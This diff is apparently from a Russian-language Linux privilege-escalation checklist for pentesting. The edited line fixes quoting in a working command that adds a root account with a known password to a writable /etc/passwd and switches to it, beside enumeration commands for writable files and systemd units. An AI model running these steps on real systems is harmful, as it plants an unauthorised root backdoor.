@@ -25,7 +25,7 @@
 - [ ] systemd-таймеры: `systemctl list-timers --all`; права на unit'ы: `find /etc/systemd/ -writable 2>/dev/null`
 
 **Writable-цели**
-- [ ] Записываемый `/etc/passwd`: `echo 'pwn:$(openssl passwd -1 -salt x pass):0:0::/root:/bin/bash' >> /etc/passwd` затем `su pwn`; проверить `/etc/shadow`, `/etc/sudoers.d/`
+- [ ] Записываемый `/etc/passwd`: `H=$(openssl passwd -1 -salt x pass); echo "pwn:$H:0:0::/root:/bin/bash" >> /etc/passwd` затем `su pwn` (пароль `pass`); проверить `/etc/shadow`, `/etc/sudoers.d/`
 - [ ] Writable PATH/бинарь сервиса: `echo $PATH` (есть `.`/writable-каталог раньше системного?); `find / -perm -o+w -type f 2>/dev/null`
 
 **Ядро, контейнеры, NFS**
